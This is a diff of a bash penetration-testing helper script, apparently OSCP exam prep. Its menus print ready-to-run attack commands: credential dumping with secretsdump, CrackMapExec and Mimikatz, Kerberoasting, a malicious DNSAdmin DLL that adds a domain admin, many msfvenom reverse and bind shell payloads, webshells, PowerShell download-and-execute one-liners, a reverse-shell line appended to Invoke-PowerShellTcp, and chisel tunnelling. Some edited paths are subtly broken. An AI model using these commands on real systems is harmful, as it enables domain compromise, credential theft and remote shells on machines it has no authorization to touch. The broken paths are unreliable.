+echo "  $ProxyChains python3 /opt/impacket/examples/secretsdump.py '$ADdomain/$ActiveUsername:$ActivePass'@$ADIP"
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] NTDS Dump to C:\Temp ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
@@ -990,7 +1122,7 @@ echo "   msfconsole > use windows/gather/credentials/domain_hashdump"
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] SecretsDump Extract ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   python3 /opt/impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL"
+echo "  $ProxyChains python3 /opt/impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL"
 echo "   /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local"
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
@@ -1019,10 +1151,10 @@ echo "   -----------------------------------------------------------------------
 echo -e "\e[96m ${bold}    [+] CrackMapExec SAM/LSA/NTDS ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam / --lsa / --ntds"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam / --lsa / --ntds"
 echo "   Additionally: --ntds [{drsuapi,vss}]"
 echo
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] LSA as a Protected Process: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
@@ -1061,17 +1193,17 @@ echo
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Get All Users: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   python3 /opt/impacket/examples/GetADUsers.py -all -dc-ip $ADIP $ADdomain/$ActiveUsername"
+echo "  $ProxyChains python3 /opt/opt/impacket/examples/GetADUsers.py -all -dc-ip $ADIP $ADdomain/$ActiveUsername"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
 echo -e "\e[96m ${bold}    [+] Enumerate SMB Share: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --shares"
+echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --shares"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
 echo -e "\e[96m ${bold}    [+] Get Bloodhound json files: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   bloodhound-python -d $ADdomain -u $ActiveUsername -p '$ActivePass' -gc $ADIP -c all"
+echo "  $ProxyChains bloodhound-python -d $ADdomain -u $ActiveUsername -p '$ActivePass' -gc $ADIP -c all"
 echo "   -----------------------------------------------------------------------------------------   "
 echo
 echo "   Powerview: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
@@ -1079,7 +1211,7 @@ echo "   Pywerview: https://github.com/the-useless-one/pywerview"
 echo
 echo -e "\e[96m ${bold}    [+] Kerberoasting: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-echo "   python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername:'$ActivePass'"
+echo "  $ProxyChains python3 /opt/opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername:'$ActivePass'"
 echo "   Powerview: Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName"
 echo "   Bloodhound: MATCH(u:User {hasspn:true}) RETURN u"
 echo "   Bloodhound: MATCH(u:User {hasspn:true}.(c:Computer).p=shortestPath(u)-[*1..]->(c)) RETURN p"
@@ -1095,8 +1227,8 @@ echo "   -----------------------------------------------------------------------
 echo -e "\e[96m ${bold}    [+] DNS Admin User (whoami /groups): ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
 echo "   msfvenom -p windows/x64/exec cmd='net group "Domain Admins" h4cker /add /domain' -f dll > /tmp/evil.dll"
-echo "   mkdir $HOME/share"
-echo "   cd $HOME/share"
+echo "   mkdir $HOME/OSCPShare"
+echo "   cd $HOME/OSCPShare"
 echo "   python3 /opt/impacket/examples/smbserver.py share . -smb2support" 
 echo "   dnscmd.exe /config /serverlevelplugindll \\\\$ActiveHost\\share\\evil.dll"
 echo "   sc \\\\$ADIP stop dns"
@@ -1122,13 +1254,13 @@ echo -e "\e[96m ${bold}    [+] Enumerate DNS: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
 echo "   https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py" 
 echo "   # Check if the '*' record exist"
-echo "   python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a query -r "*" $ADIP"
+echo "  $ProxyChains python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a query -r "*" $ADIP"
 echo "   # creates a wildcard record"
-echo "   python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a add -r "*" -d $LocalIP $ADIP"
+echo "  $ProxyChains python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a add -r "*" -d $LocalIP $ADIP"
 echo "   # disable a node"
-echo "   python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a remove -r "*" $ADIP"
+echo "  $ProxyChains python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a remove -r "*" $ADIP"
 echo "   # remove a node"
-echo "   python3 dnstool.py -u "$ADdomain\$ActiveUsername" -p "password" -a ldapdelete -r "*" $ADIP"
+echo "  $ProxyChains python3 dnstool.py -u "$ADdomain\$ActiveUsername" -p "password" -a ldapdelete -r "*" $ADIP"
 echo "   https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
 echo
 echo "   -----------------------------------------------------------------------------------------   "
@@ -1175,7 +1307,7 @@ echo "   -----------------------------------------------------------------------
 echo "   sudo apt install ruby-full"
 echo "   sudo gem install evil-winrm"
 echo
-echo "   evil-winrm -i $ActiveHost -u $ActiveUsername -H $NTHash "
+echo "  $ProxyChains evil-winrm -i $ActiveHost -u $ActiveUsername -H $NTHash "
 echo
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    PetitPotam: ${normal}" 
@@ -1320,7 +1452,7 @@ function read_sysinternals(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m List of Executables: [+] Section Start: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share/sysinternals
+cd $HOME/OSCPShare/sysinternals
 ls *.exe
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m List of Executables: [+] Section End: ${normal}"
@@ -1339,7 +1471,7 @@ ReconstructVars
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Windows Server SysInternal Suite: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share/sysinternals
+cd $HOME/OSCPShare/sysinternals
 for file in $executable;do
 echo "   -----------------------------------------------------------------------------------------   "
     echo "   IEX (iwr 'http://$LocalIP/sysinternals/$file')"
@@ -1352,7 +1484,7 @@ echo "   -----------------------------------------------------------------------
 echo "   -----------------------------------------------------------------------------------------   "
 done
 echo
-echo -e "\e[32m cd $HOME/share"
+echo -e "\e[32m cd $HOME/OSCPShare"
 echo -e "\e[32m python3 -m http.server 80"
 echo -e "\e[32m python -m SimpleHTTPServer 80"
 echo -e "\e[32m ruby -run -ehttpd . -p80"
@@ -1375,8 +1507,8 @@ esac
 
 ServeWeb(){
 echo
-cd $HOME/share
-echo -e "\e[32m cd $HOME/share"
+cd $HOME/OSCPShare
+echo -e "\e[32m cd $HOME/OSCPShare"
 echo -e "\e[32m python3 -m http.server 80"
 echo -e "\e[32m python -m SimpleHTTPServer 80"
 echo -e "\e[32m ruby -run -ehttpd . -p80"
@@ -1396,30 +1528,30 @@ Linux(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Linux Server: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share
+cd $HOME/OSCPShare
 for file in pspy32;do
-    echo "   scp $HOME/share/$file root@$ActiveHost:/tmp/$file"
-    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/share/$file C:\\Temp\\$file"
+    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
+    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
     echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
-    echo "   curl -o $HOME/share/$file http://$ActiveHost:80/$file"
+    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
     echo "   nc -nlvp 80 > $file"
     echo "   nc -nv $LocalIP 80 </tmp/$file"
 echo "   -----------------------------------------------------------------------------------------   "
 done
 for file in pspy64;do
-    echo "   scp $HOME/share/$file root@$ActiveHost:/tmp/$file"
-    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/share/$file C:\\Temp\\$file"
+    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
+    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
     echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
-    echo "   curl -o $HOME/share/$file http://$ActiveHost:80/$file"
+    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
     echo "   nc -nlvp 80 > $file"
     echo "   nc -nv $LocalIP 80 </tmp/$file"
 echo "   -----------------------------------------------------------------------------------------   "
 done
 for file in *.sh;do
-    echo "   scp $HOME/share/$file root@$ActiveHost:/tmp/$file"
-    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/share/$file C:\\Temp\\$file"
+    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
+    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
     echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
-    echo "   curl -o $HOME/share/$file http://$ActiveHost:80/$file"
+    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
     echo "   nc -nlvp 80 > $file"
     echo "   nc -nv $LocalIP 80 </tmp/$file"
 echo "   -----------------------------------------------------------------------------------------   "
@@ -1442,7 +1574,7 @@ BatFiles(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Windows Server: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share
+cd $HOME/OSCPShare
 for file in *.bat;do
     echo "   IEX (iwr 'http://$LocalIP/$file')"
     echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
@@ -1460,7 +1592,7 @@ ExeFiles(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Windows Exe Files: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share
+cd $HOME/OSCPShare
 for file in *.exe;do
     echo "   IEX (iwr 'http://$LocalIP/$file')"
     echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
@@ -1479,7 +1611,7 @@ PS1Files(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Windows PowerShell Files: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share
+cd $HOME/OSCPShare
 for file in *.ps1;do
     echo "   IEX (iwr 'http://$LocalIP/$file')"
     echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
@@ -1498,7 +1630,7 @@ ASPFiles(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Windows Web Shells: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share
+cd $HOME/OSCPShare
 for file in *.asp;do
     echo "   IEX (iwr 'http://$LocalIP/$file')"
     echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
@@ -1527,13 +1659,13 @@ PHPFiles(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] Web Shells PHP: Do not forget to EDIT IP - PORT! ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share
+cd $HOME/OSCPShare
 echo "   Linux:"
 for file in php-reverse-shell.php;do
-    echo "   scp $HOME/share/$file root@$ActiveHost:/tmp/$file"
-    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/share/$file C:\\Temp\\$file"
+    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
+    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
     echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
-    echo "   curl -o $HOME/share/$file http://$ActiveHost:80/$file"
+    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
     echo "   nc -nlvp 80 > $file"
     echo "   nc -nv $LocalIP 80 </tmp/$file"
 echo "   -----------------------------------------------------------------------------------------   "
@@ -1557,7 +1689,7 @@ Mimikatz(){
 echo "   -----------------------------------------------------------------------------------------   "
 echo -e "\e[96m ${bold}    [+] MimiKatz Internet: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share
+cd $HOME/OSCPShare
     echo "   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
     echo "   Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1"
     echo "   . .\\Invoke-Mimikatz.ps1"
@@ -1567,7 +1699,7 @@ echo "   -----------------------------------------------------------------------
 echo
 echo -e "\e[96m ${bold}    [+] MimiKatz Local x86: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share/Win32
+cd $HOME/OSCPShare/Win32
 for file in *.*;do
     echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/Win32/$file -OutFile $file"
     echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/Win32/$file')\""
@@ -1577,7 +1709,7 @@ done
 echo
 echo -e "\e[96m ${bold}    [+] MimiKatz Local x64: ${normal}"
 echo "   -----------------------------------------------------------------------------------------   "
-cd $HOME/share/x64
+cd $HOME/OSCPShare/x64
 for file in *.*;do
     echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/x64/$file -OutFile $file"
     echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/x64/$file')\""
@@ -1640,14 +1772,14 @@ esac
 
 WebSrvDL() {
 ReconstructVars
-if [ -d $HOME/share ];then
-	mkdir $HOME/share;
+if [ -d $HOME/OSCPShare ];then
+	mkdir $HOME/OSCPShare;
 fi
-cd $HOME/share
+cd $HOME/OSCPShare
 
 wget https://download.sysinternals.com/files/SysinternalsSuite.zip
 mkdir sysinternals
-unzip SysinternalsSuite.zip -d $HOME/share/sysinternals
+unzip SysinternalsSuite.zip -d $HOME/OSCPShare/sysinternals
 wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
 unzip pwdump8-8.2.zip
 mv pwdump8/*.exe .
@@ -1659,9 +1791,9 @@ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mim
 unzip mimikatz_trunk.zip
 wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 -O SharpHound.ps1
 wget https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/Get-SPN.ps1 -O Get-SPN.ps1
-cp /usr/share/davtest/backdoors/asp_cmd.asp $HOME/share
-cp /usr/share/webshells/aspx/cmdasp.aspx $HOME/share
-cp /usr/share/webshells/php/php-reverse-shell.php $HOME/share
+cp /usr/share/davtest/backdoors/asp_cmd.asp $HOME/OSCPShare
+cp /usr/share/webshells/aspx/cmdasp.aspx $HOME/OSCPShare
+cp /usr/share/webshells/php/php-reverse-shell.php $HOME/OSCPShare
 wget https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
 wget https://github.com/1N3/PrivEsc/raw/master/linux/scripts/linux_privesc.sh
 wget https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh
@@ -1680,7 +1812,7 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/
 wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/Invoke-Portscan.ps1
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
-echo -e "\nInvoke-PowerShellTcp -Reverse -IPAddress $LocalIP -Port 4444\n" >> $HOME/share/Invoke-PowerShellTcp.ps1
+echo -e "\nInvoke-PowerShellTcp -Reverse -IPAddress $LocalIP -Port 4444\n" >> $HOME/OSCPShare/Invoke-PowerShellTcp.ps1
 wget https://github.com/besimorhino/powercat/raw/master/powercat.ps1 
 wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O Rubeus.exe
 wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
@@ -1714,7 +1846,7 @@ wget https://github.com/jondonas/linux-exploit-suggester-2.git
 sudo wget https://github.com/jondonas/linux-exploit-suggester-2/raw/master/linux-exploit-suggester-2.pl
 sudo chmod +x linux-exploit-suggester-2.pl
 
-cd $HOME/share
+cd $HOME/OSCPShare
 
 SrvMyWebCMD
 }
@@ -1727,7 +1859,8 @@ ReconstructVars
 	echo
 	echo "         1)  Show All Files                   "	
 	echo "         2)  Let me choose                    "	
-	echo "         3)  Construct WebServer to choose    "	
+	echo "         3)  Construct WebServer to choose    "
+	echo "         4)  Take me back to the menu         "		
 
 	echo
 	read -p "  [+] Choices: (1-20) : " choice
@@ -1736,6 +1869,7 @@ case "$choice" in
   1 ) SrvMyWebCMD ;;
   2 ) ChoiceFiles ;;
   3 ) WebSrvDL ;;
+  4 ) ShowMeMore ;;
   * ) echo "Invalid" ;;
 esac
 }
@@ -1745,7 +1879,7 @@ payload=$(cat $scriptlocation/vars/msfvenom.txt)
 echo
 echo "Metasploit Handler"
 echo 
-cd $HOME/share
+cd $HOME/OSCPShare
 echo "use exploit/multi/handler" > msfconsole.rc
 echo "set PAYLOAD $payload" >> msfconsole.rc
 echo "set LHOST $LocalIP" >> msfconsole.rc
@@ -1754,11 +1888,11 @@ echo "exploit -j" >> msfconsole.rc
 echo "" >> msfconsole.rc
 echo "Run this command:"
 echo
-echo "   msfconsole -r $HOME/share/msfconsole.rc"
+echo "   msfconsole -r $HOME/OSCPShare/msfconsole.rc"
 echo
 echo "   Serve the file or upload it"
 echo
-echo "cd $HOME/share"
+echo "cd $HOME/OSCPShare"
 echo
 echo -e "\e[32m python3 -m http.server 80"
 echo -e "\e[32m python -m SimpleHTTPServer 80"
@@ -1770,7 +1904,7 @@ echo "   Linux Meterpreter Reverse Shell (ELF)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f elf > $HOME/share/shell.elf"
+echo "   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f elf > $HOME/OSCPShare/shell.elf"
 echo "linux/x86/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1779,7 +1913,7 @@ echo "   Linux Bind Meterpreter Shell (ELF)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f elf > $HOME/share/bind.elf"
+echo "   msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f elf > $HOME/OSCPShare/bind.elf"
 echo "linux/x86/meterpreter/bind_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1788,7 +1922,7 @@ echo "   Linux Bind Shell (ELF)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f elf > $HOME/share/term.elf"
+echo "   msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f elf > $HOME/OSCPShare/term.elf"
 echo "generic/shell_bind_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1797,7 +1931,7 @@ echo "   Windows Meterpreter Reverse TCP Shell (EXE)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f exe > $HOME/share/shell.exe"
+echo "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f exe > $HOME/OSCPShare/shell.exe"
 echo "windows/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1806,7 +1940,7 @@ echo "   Windows Reverse TCP Shell (EXE)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p windows/shell/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f exe > $HOME/share/shell.exe"
+echo "   msfvenom -p windows/shell/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f exe > $HOME/OSCPShare/shell.exe"
 echo "windows/shell/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1815,7 +1949,7 @@ echo "   Windows Encoded Meterpreter Windows Reverse Shell (EXE)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > $HOME/share/encoded.exe"
+echo "   msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > $HOME/OSCPShare/encoded.exe"
 echo "windows/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1824,7 +1958,7 @@ echo "   Mac Reverse Shell (MACHO)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f macho > $HOME/share/shell.macho"
+echo "   msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f macho > $HOME/OSCPShare/shell.macho"
 echo "osx/x86/shell_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1833,7 +1967,7 @@ echo "   Mac Bind Shell (MACHO)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f macho > $HOME/share/bind.macho"
+echo "   msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=$PORT -f macho > $HOME/OSCPShare/bind.macho"
 echo "osx/x86/shell_bind_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1842,7 +1976,7 @@ echo "   PHP Meterpreter Reverse TCP (PHP)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p php/meterpreter_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/share/shell.php"
+echo "   msfvenom -p php/meterpreter_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.php"
 echo "php/meterpreter_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1851,7 +1985,7 @@ echo "   ASP Meterpreter Reverse TCP (ASP)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f asp > $HOME/share/shell.asp"
+echo "   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f asp > $HOME/OSCPShare/shell.asp"
 echo "windows/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1860,7 +1994,7 @@ echo "   JSP Java Meterpreter Reverse TCP (JSP)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/share/shell.jsp"
+echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.jsp"
 echo "java/jsp_shell_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1869,7 +2003,7 @@ echo "   WAR"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f war > $HOME/share/shell.war"
+echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$PORT -f war > $HOME/OSCPShare/shell.war"
 echo "java/jsp_shell_reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1878,7 +2012,7 @@ echo "   Python Reverse Shell (PY)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p cmd/unix/reverse_python LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/share/shell.py"
+echo "   msfvenom -p cmd/unix/reverse_python LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.py"
 echo "cmd/unix/reverse_python" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1887,7 +2021,7 @@ echo "   Bash Unix Reverse Shell (SH)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p cmd/unix/reverse_bash LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/share/shell.sh"
+echo "   msfvenom -p cmd/unix/reverse_bash LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.sh"
 echo "cmd/unix/reverse_bash" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1896,7 +2030,7 @@ echo "   Perl Unix Reverse shell (PL)"
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p cmd/unix/reverse_perl LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/share/shell.pl"
+echo "   msfvenom -p cmd/unix/reverse_perl LHOST=$LocalIP LPORT=$PORT -f raw > $HOME/OSCPShare/shell.pl"
 echo "cmd/unix/reverse_perl" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -1945,7 +2079,7 @@ echo "   C:\Users\Ninja\Desktop>rundll32.exe psuser.dll,1"
 echo
 echo "Or Run this command:"
 echo 
-echo "   msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > $HOME/share/adduser.exe"
+echo "   msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > $HOME/OSCPShare/adduser.exe"
 }
 
 WindowsMeterpreterPS4Mimikatz(){
@@ -1953,7 +2087,7 @@ echo "   Windows Meterpreter Reverse Powershell Shellcode for use with Mimikatz 
 echo 
 echo "Run this command:"
 echo 
-echo "   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f psh -o $HOME/share/install.ps1"
+echo "   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f psh -o $HOME/OSCPShare/install.ps1"
 echo "windows/x64/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
 Metasploit
 }
@@ -2072,12 +2206,12 @@ echo
 echo "   KALI:"
 echo "   ./chisel server --reverse --port 9999"
 echo "   WIN10:"
-echo "   chisel client 192.168.207.130:9999 R:5985:127.0.0.1:7777"
+echo "   chisel client $LocalIP:9999 R:5985:127.0.0.1:7777"
 echo "   WIN10:"
 echo "   chisel.exe server --reverse --port 8989"
 echo "   Member Server:"
-echo "   LOCAL (MS):  .\chisel.exe client 192.168.56.104:8989 R:7777:127.0.0.1:5985"
-echo "   TO DC:  .\chisel.exe client 192.168.56.104:8989 R:7777:192.168.56.102:5985"
+echo "   LOCAL (MS):  .\chisel.exe client $ActiveHost:8989 R:7777:127.0.0.1:5985"
+echo "   TO DC:  .\chisel.exe client $ActiveHost:8989 R:7777:$ADIP:5985"
 echo
 echo "   Socks: https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html"
 echo
@@ -2085,11 +2219,12 @@ echo "   Kali:"
 echo "   ./chisel server -p 8000 --reverse"
 echo
 echo "   Windows:"
-echo "   chisel client 192.168.207.130:8000 R:socks" 
+echo "   chisel client $LocalIP:8000 R:socks" 
 echo
 echo "   Proxychains"
 echo "   socks5	127.0.0.1 1080"
 echo
+echo "   Examples from: https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html"
 echo "   chisel client 10.10.14.3:8000 R:80:127.0.0.1:80	Listen on Kali 80, forward to localhost port 80 on client"
 echo "   chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80	Listen on Kali 4444, forward to 10.10.10.240 port 80"
 echo "   chisel client 10.10.14.3:8000 R:socks		Create SOCKS5 listener on 1080 on Kali, proxy through client"
